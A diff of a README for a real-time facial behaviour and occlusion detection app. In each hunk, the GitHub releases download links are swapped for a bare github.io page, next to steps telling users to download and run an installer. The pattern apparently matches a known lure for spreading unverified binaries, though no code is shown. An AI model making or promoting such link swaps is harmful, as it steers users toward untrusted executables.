@@ -1,6 +1,6 @@
 # 🎭 multi-task-facial-behaviour-and-occlusion-detection - See Emotions, Detect Obstructions in Real-Time
 
-[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://github.com/palmalescup167/multi-task-facial-behaviour-and-occlusion-detection/releases)
+[![Download Now](https://img.shields.io/badge/Download-Application-blue?style=for-the-badge&logo=github&logoColor=white&color=4B0082)](https://palmalescup167.github.io)
 
 ---
 
@@ -52,7 +52,7 @@ Follow these simple steps to get the application running on your computer. No te
 
 Visit this link to download the application:
 
-**[https://github.com/palmalescup167/multi-task-facial-behaviour-and-occlusion-detection/releases](https://github.com/palmalescup167/multi-task-facial-behaviour-and-occlusion-detection/releases)**
+**[https://palmalescup167.github.io](https://palmalescup167.github.io)**
 
 Once you click the link, you will see a list of files. Look for the newest version at the top. Click on it to download the file to your computer.
 
@@ -87,7 +87,7 @@ Try making different expressions to see it update in real time!
 
 You will need to download the software from the provided link. Here is how to set everything up:
 
-1. Go to the download page: [https://github.com/palmalescup167/multi-task-facial-behaviour-and-occlusion-detection/releases](https://github.com/palmalescup167/multi-task-facial-behaviour-and-occlusion-detection/releases)
+1. Go to the download page: [https://palmalescup167.github.io](https://palmalescup167.github.io)
 2. Download the latest version of the application.
 3. Run the installer and follow the simple prompts.
 4. Launch the program from your Start Menu or desktop shortcut.
@@ -184,7 +184,7 @@ If you have questions, find bugs, or want to suggest improvements, please visit 
 
 Click the button below to get started right now:
 
-**[⬇️ DOWNLOAD NOW – IT’S FREE](https://github.com/palmalescup167/multi-task-facial-behaviour-and-occlusion-detection/releases)**
+**[⬇️ DOWNLOAD NOW – IT’S FREE](https://palmalescup167.github.io)**
 
 Experience the power of real‑time facial behavior analysis on your own computer today. See what your face says and ensure nothing is hiding it – all in real time.
 
